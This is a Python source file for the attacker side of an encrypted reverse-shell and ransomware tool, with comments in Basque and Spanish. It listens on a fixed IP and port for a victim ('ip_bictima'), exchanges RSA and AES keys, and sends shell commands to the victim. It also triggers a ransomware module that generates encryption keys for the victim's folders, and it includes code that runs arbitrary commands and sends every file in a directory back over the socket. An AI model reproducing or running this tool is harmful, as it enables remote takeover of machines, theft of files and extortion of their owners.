import os
import socket 
import time
import win32api
import sys
import threading
import zlib
import pickle
import json
import binascii
from pwn import * 
from termcolor  import colored
from fitxategiak.asimetric import asime
from fitxategiak.aesencrypt import aesenc
from fitxategiak.ranson import ransow


class server(object):
    def __init__(self,ip_bictima,portua,koneksioak):
        try: 
            #jenerador de claves
            self.GPG = asime(".")
            self.GPG.Generastekey("server") 
            self.ranso = ransow() 
            s = """

     /|
    / |
   /__|______
  |  __  __  |
  | |  ||  | | 
  | |__||__| |
  |  __  __()|      
  | |  ||  | |
  | |  ||  | |
  | |__||__| |
  |__________|                                                                      
                               
 _                                                
| |_ ___ _ __    _ __ _____   _____ _ __ ___  ___ 
| __/ __| '_ \  | '__/ _ \ \ / / _ \ '__/ __|/ _ \ 
| || (__| |_) | | | |  __/\ V /  __/ |  \__ \  __/
 \__\___| .__/  |_|  \___| \_/ \___|_|  |___/\___|
        |_|                                                                                              

 #  $                  &&&&&&            
 # ##                 &&0000&&         
 ####################&&&    &&&     
 ####################&&&    &&&    RSA/AES ENCRIPTATION TCP 
                      &&0000&&     
                       &&&&&&                                            
                """
            print(s)    
            print("\n")
            self.encriAes = None
            self.decriptAes = None
            #conesion socekt
            self.so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.so.bind((ip_bictima,portua))
            self.so.listen(koneksioak)
            self.soc , addr = self.so.accept()
        except :
            print("server error")
        

    def buffLengG(self):
      lengEn = self.soc.recv(1024)
      print(lengEn)
      Strleng = str(self.decriptAes.decript(lengEn),encoding='utf-8')
      leng = int(Strleng)
      self.soc.send(b'1')
      return(leng)



    
    def comandLine(self):
        lenBUffer = self.buffLengG()
        rutaJaso = self.soc.recv(lenBUffer)
        rutaJasoDEC = self.decriptAes.decript(rutaJaso)
        url = str(rutaJasoDEC,encoding='utf-8')
        ar = url.split("@")
        mezua = input(colored(ar[0],'yellow') + colored('@','red')+colored(ar[1],'cyan') +colored(">",'red'))
        if len(mezua) == 0 :
            mezua = " " 
        mezuaENc = self.encriAes.encript(bytes(mezua,encoding='utf-8'))
        self.soc.send(mezuaENc)
        return mezua


    def cmdGlobal(self):
       
       lenBuffer = self.buffLengG()
       recCmd = self.soc.recv(lenBuffer)
       desCmd = self.decriptAes.decript(recCmd)
       print(str(desCmd,encoding='utf-8'))
       
      

    def getPuKey(self):
        keyP =  self.soc.recv(1024)
        clientKey = open(f'pUcliente.pem','w')
        for x in keyP.splitlines():
            clientKey.write(f'{str(x,"utf-8")}\n')
    
    def postPuKey(self):
        url = os.getcwd()
        filBT = None
        with open('pUserver.pem', "rb") as key_file:
           filBT = key_file.read()
        self.soc.send(filBT)
    
    def keysLoad(self):
        self.GPG.loadPublic("pUcliente.pem")
        os.chdir("../prybate")
        self.GPG.loadPrymari("prybate.pem")
        os.chdir("../../")
        self.GPG.delete()

    def Aeskeyload(self):
        key = binascii.hexlify(os.urandom(32))
        iv = binascii.hexlify(os.urandom(16))
        decriAes = {}
        decriAes["key"] = str(key,encoding='utf-8')
        decriAes["iv"] = str(iv,encoding='utf-8')
        strDecriAes = json.dumps(decriAes)
        bytDecriAes = bytes(strDecriAes,encoding='utf-8')
        self.decriptAes = aesenc(binascii.unhexlify(bytes(decriAes["key"],encoding='utf-8')),binascii.unhexlify(bytes(decriAes["iv"],encoding='utf-8')))
        EnencriAes = self.soc.recv(1024)
        DeencriAes = str(self.GPG.decrypt(EnencriAes),encoding='utf-8')
        encriAes = json.loads(DeencriAes)
        self.encriAes = aesenc(binascii.unhexlify(bytes(encriAes['key'],encoding='utf-8')),binascii.unhexlify(bytes(encriAes['iv'],encoding='utf-8')))
        EndecriAes = self.GPG.encrypted(bytDecriAes)
        self.soc.send(EndecriAes)
       
    def encripTf(self,arrCmd):
       try:
        self.ranso.Generefolder()
        ar = arrCmd[1:]
        arn = " ".join(ar)
        print(arn)
        if arn != "pc":
            key = self.ranso.GenerateKey(arn,"one")
            keyen = self.encriAes.encript(bytes(key,encoding='utf-8'))
            self.soc.send(keyen)
            merec = str(self.decriptAes.decript(self.soc.recv(1024)),encoding='utf-8')
            print(merec)
       except:
          print("falta la sintasis")

    def koneksioa(self):
      while True:
          user = win32api.GetUserName()
          url = os.getcwd()#ruta aktuala 
          self.soc.send(bytes( user + "@" + url,encoding = 'utf-8'))# bidali ruta aktuala
          hartuta = self.soc.recv(1024) # guk bidalitako mezua hartuko du (1024) bytes
          stri = str(hartuta,encoding='utf-8')# guk bialitako mezu string modura biurtuko du
          if stri == "itxi": #mezua itxi baldinbada buklea mozten da 
              break 
          #funtzioak
          comand = stri.split(" ")#honen bitartez gure mezua zatitzen dugu espazioaren bitartez
          if comand[0].lower() == "cd" and len(comand) > 1:#mezuaren lenego partea cd bada 
              erantzuna = " "
              if comand[1] == "..":#mezuaren lenego partea .. bada 
                url_a = url.split("\\")[:-1] #gure datuak \\ kontuan hartuta array bat sortzen du ondoren azkeneko array a kentzen du
                url = ""# baliable buleano bat 
                for x in url_a:# url_a arraya zearkatzeko x datuan bitartez
                  url += x + "\\"#ruta osatzeko metodoa
                os.chdir(url)#guk sortu dugun rutara juateko
              else:
                  lo = ""
                  if len(comand) > 2:# mezuaren zatiak 2 baino handiagoak badira
                      for x in comand[1:len(comand)]:# comadoaren lenengo zatia kenduta gainontzeko guztia kentzxen du eta x bitartez dena zearkatzen du
                          lo += x + " " #harturiko zati guztiak lotzen ditu 
                      comand[1] = lo # comand[1] egindako lotura izango da 
                  ruta_absoluta = False # ruta absolutua false balioa edukiko du
                  drives = win32api.GetLogicalDriveStrings()#gure diskoaren identifikadorea hartuko ditu 
                  rutak = drives.split("\000")[:-1] #identifikadore bakoitza arry batean sartuko ditu barra kendurik
                  ar_ruta = comand[1].split("\\")# guk sartutako mezua \\ bitartez sailkatuko du
                  for disk in rutak:# rutak zearkatuko ditu disk bitartez
                      if disk[:-1].lower() == ar_ruta[0].lower():# identifikadorea eta lehengo arrya igualak badira ruta absolutua true izango da
                          ruta_absoluta = True
                  if ruta_absoluta == True: # ruta absolutua true baldinbada 
                    try:
                        os.chdir(comand[1].lower())# idatzitako rutara abiatuko gara
                    except IOError as e:# ruta gaizki baldinbadago mezua errore bat bidaliko du
                        erantzuna = "comandoa gaizki dago"
                  if ruta_absoluta == False:# false baldinbada
                    try:
                        ruta_re = url + "\\" + comand[1] #gure ruta contuan harturik zuk idatzitako zatia geitukodu ruta bat biurtuz
                        os.chdir(ruta_re.lower()) # idatzitako rutara juango gera 
                    except IOError as e: # ruta gaizki baldinbadago errore bat bidaliko dizu 
                         erantzuna = "comandoa gaizki dago"
              self.soc.send(bytes(erantzuna,encoding = 'utf-8')) # erantzuna bidaliko du 
          elif comand[0] != " ":
            erantzuna = " " #erantzuna utza izango da
            balioa = os.popen(stri,'r',1).close()# guk idatzitako komandoa exekutatuko du errorearen mezua bidaliz
            erantzuna = os.popen(stri,'r',1).read()#komandoaren errorea  
            print(erantzuna)
            print(balioa)   
            if balioa == 1  :# errorearen balioa 1 baldinbada 
                erantzuna = "errorea"
            if balioa == 2:# errorearen balioa 2 baldinbada 
                erantzuna = "ez dazkazu baimenik"
            if balioa == None and stri != "net user"  : 
               erantzuna = "informazio ezezaguna" 
            erantzuna_byt = bytes(erantzuna,encoding = 'utf-8')
            luz = str(sys.getsizeof(erantzuna_byt))
            self.soc.send(bytes(luz,encoding = 'utf-8'))#batuaren luzehera bidaltzen diogu
            self.soc.recv(1024)#luzehera ongi iritsi dela adierazten diogu
            self.soc.send(bytes(erantzuna,encoding = 'utf-8'))#erantzuna bidaltzeko 
          if comand[0].lower() == "local" and len(comand) > 1:
             erantzuna = "datuak OK"
             if comand[1].lower() == "all":
               di = os.listdir()
               izena_a = []
               fichategia_a = []
               luz_a = 0
               for i in di:
                if os.path.isdir(url + "\\" + i) != True:
                    try:
                        fichategia = open(i,'rb').read()
                    except MemoryError:
                        fichategia = bytes("none",encoding = 'utf-8')
                        print(fichategia)
                    i_ar = i.split(".")
                    if i_ar[len(i_ar)-1] == "iso" or i_ar[len(i_ar)-1] == "avi" or i_ar[len(i_ar)-1] == "zip":
                        fichategia = bytes("none",encoding = 'utf-8')
                        print(fichategia)
                    luzfi = str(sys.getsizeof(fichategia))
                    izena = bytes(i,encoding = 'utf-8')
                    luziz = str(sys.getsizeof(izena))
                    print("ongi: ",izena," lusehera: ",luzfi)
                    luz_a += int(luzfi) + int(luziz)
                    izena_a.append(izena)
                    fichategia_a.append(fichategia)
                    e = threading.Event()
                    e.wait(5)
               arr_obj = (izena_a,fichategia_a)
               data_string = pickle.dumps(arr_obj)
               data_arr = pickle.loads(data_string)
               print(data_arr[0])
               self.soc.send(bytes(str(luz_a),encoding = 'utf-8'))
               #1
               self.soc.recv(1024)
               #2
               self.soc.sendall(data_string)
               #3
               self.soc.recv(1024)
               #4
             else:
               erantzuna = "comandoa gaizki dago"
             self.soc.send(bytes(erantzuna,encoding = 'utf-8'))  # 5 erantzuna bidaliko du 
          #funtzioak
          print(self.soc.recv(1024))# 6 mezua ongi iritzi dela adirezten du
      #self.so.close()tcp koneksioa amaitu
      self.soc.close()#tcp koneksioa amaitu

p1 = log.progress("iniciando tcp reverse...")
ser = server("192.168.1.130",9999,1)
p1.status(colored("conexion establecida",'red'))
time.sleep(2)
p1.status(colored("cargando clabes RSA...",'red'))
ser.getPuKey()
ser.postPuKey()
ser.keysLoad()
p1.status(colored("conesion RSA establecida",'red'))
time.sleep(2)
p1.status(colored("cargando claves AES...",'red'))
time.sleep(2)
ser.Aeskeyload()
p1.status(colored("conesion AES establecida \n \n",'red'))


while True:
    comand =  ser.comandLine()
    if len(comand) != 1:
        comdaExe = comand.split(" ")
        arrComad = []
        for fd in comdaExe:
          if fd != "":
            arrComad.append(fd)
        if arrComad[0] == "cd":
            None
        if arrComad[0] == "encript":
           ser.encripTf(arrComad)
        if arrComad[0] == "exit":
           break
        elif arrComad[0] != "exit" and arrComad[0] != "cd" and arrComad[0] != "encript":
         ser.cmdGlobal()
